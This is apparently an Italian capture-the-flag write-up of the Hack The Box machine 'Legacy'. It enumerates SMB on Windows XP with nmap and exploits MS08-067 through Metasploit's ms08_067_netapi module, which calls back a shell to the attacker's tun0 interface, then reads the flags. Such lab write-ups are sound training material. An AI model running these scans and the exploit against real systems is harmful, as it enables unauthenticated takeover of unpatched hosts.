+++
date = '2026-07-21T02:48:52+02:00'
draft = false
title = 'Legacy Writeup IT'
+++
**Nome**: **`joy.scd01`**

**Data**: **`19/04/2026`**

![Legacy.png](/images/imgs_legacy/Legacy.png)

---
# Introduzione

**_Legacy_** è una macchina **Windows** di livello **Easy** che fa assolutamente onore al suo nome. È una macchina molto lineare che evidenzia i rischi estremi derivanti dall'esposizione di servizi obsoleti e non patchati, nello specifico **SMB**, su sistemi operativi datati come **Windows XP**. È un laboratorio perfetto per i principianti, l'ho pwnata seguendo rigorosamente la metodologia **eJPT**, dato che al tempo mi stavo preparando per quella determinata certificazione. L'exploitation path non richiede alcun lateral movement o privilege escalation, in quanto è un one-shot diretto a **`NT AUTHORITY\SYSTEM`** sfruttando una classica **CVE**.

---
# Tecniche Utilizzate

- **Enumerazione SMB**

- **Vulnerability Scanning (Nmap Scripts)**

- **Metasploit Framework**

- **Exploitation of MS08-067 (CVE-2008-4250)**

# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- -oA nmap/all legacy -Pn
```

```text
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127
```

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV -oA nmap/services legacy -Pn
```

```text
PORT     STATE    SERVICE        REASON          VERSION
135/tcp  open     msrpc          syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open     netbios-ssn    syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds   syn-ack ttl 127 Windows XP microsoft-ds
1035/tcp filtered multidropper   no-response
1719/tcp filtered h323gatestat   no-response
6547/tcp filtered powerchuteplus no-response
6567/tcp filtered esp            no-response
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 16915/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 46814/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 60321/udp): CLEAN (Failed to receive data)
|   Check 4 (port 7522/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2026-04-24T20:45:50+03:00
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:69:ab (VMware)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|   LEGACY<20>           Flags: <unique><active>
|   HTB<1e>              Flags: <group><active>
|   HTB<1d>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   00 50 56 94 69 ab 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_clock-skew: mean: 5d00h27m38s, deviation: 2h07m16s, median: 4d22h57m38s
```

**Porte aperte**:

- **135**/tcp - MSRPC

- **139**/tcp - NetBIOS

- **445**/tcp - SMB

Guardando l'output di **nmap**, ho subito notato la riga **`_smb2-time: Protocol negotiation failed (SMB2)`**, il che implica fortemente che la macchina stia eseguendo **SMBv1**.

Per confermare i miei sospetti, ho lanciato una scansione mirata usando gli script di **nmap** per le vulnerabilità legate ad **SMB**:

```bash
nmap --script=smb-vuln* legacy -p 445
```

![smb-vulns.png](/images/imgs_legacy/smb-vulns.png)

La scansione ha dato esito positivo per due vulnerabilità critiche:
- **CVE-2008-4250** (modulo **`ms08_067_netapi`**).
- **CVE-2017-0143** (**`ms17_010`**, aka **EternalBlue**).

---
# Exploitation | MS08-067

**Nota**: _La vulnerabilità **`MS08-067`** (**CVE-2008-4250**) è uno **stack-based buffer overflow** nella libreria **`Netapi32.dll`**. Sfrutta una falla nel modo in cui il servizio Server di **Windows** gestisce le richieste **RPC** (nello specifico, la funzione **`NetPathCanonicalize`**). Inviando una stringa formattata in modo malevolo, un attaccante può sovrascrivere il buffer fino all'overflow e così eseguire codice arbitrario. Entrambe le vulnerabilità (**`MS08-067`** e **`MS17-010`**) sono iconiche e altamente critiche, in quanto garantiscono una **Remote Code Execution Non Autenticata** (**RCE**) con privilegi di **`NT AUTHORITY\SYSTEM`**. Sebbene **EternalBlue** sia estremamente famosa, per questo box ho optato per **`MS08-067`** semplicemente perché avevo già sfruttato **`MS17-010`** diverse volte su altre macchine._

Per mantenere tutto organizzato, ho avviato il database **PostgreSQL**, lanciato **msfconsole**, creato un workspace dedicato e importato gli output **XML** di **nmap** generati in precedenza.

```bash
service start postgresql
msfconsole
```

All'interno di **Metasploit**:

```bash
workspace -a legacy
db_import ~/HTB/Machines/Legacy/nmap/all.xml
db_import ~/HTB/Machines/Legacy/nmap/services.xml
```

![ws.png](/images/imgs_legacy/ws.png)

Successivamente, ho cercato il modulo **`ms08_067`** e
configurato le opzioni necessarie.
```bash
search ms08_067
use 0
show options
set RHOSTS legacy
set LHOST tun0
set LPORT 22667
exploit
```

![ms.png](/images/imgs_legacy/ms.png)
![so.png](/images/imgs_legacy/so.png)
![exploit.png](/images/imgs_legacy/exploit.png)

Poiché questa vulnerabilità compromette direttamente il sistema, non c'è stato bisogno di una fase separata di privilege escalation.

Sono entrato in una shell e ho preso sia la **user** che la **root flag**.

```cmd
shell
type "C:\Documents and Settings\john\Desktop\user.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

![user.png](/images/imgs_legacy/user.png)
![root.png](/images/imgs_legacy/root.png)

---
# Considerazioni Finali

**_Legacy_** è un box veramente facilissimo. Funge principalmente da introduzione per i principianti a **Metasploit** e alle classiche **CVE** di **Windows**. Sebbene non offra un exploitation chain complessa, è un ottimo promemoria di quanto possano essere devastanti i protocolli legacy come **SMBv1** se lasciati abilitati. Scenario perfetto per applicare la metodologia **eJPT**: enumerazione strutturata, vulnerability scanning e un'esecuzione pulita tramite la gestione del database di **MSF** hanno reso l'intero processo incredibilmente fluido.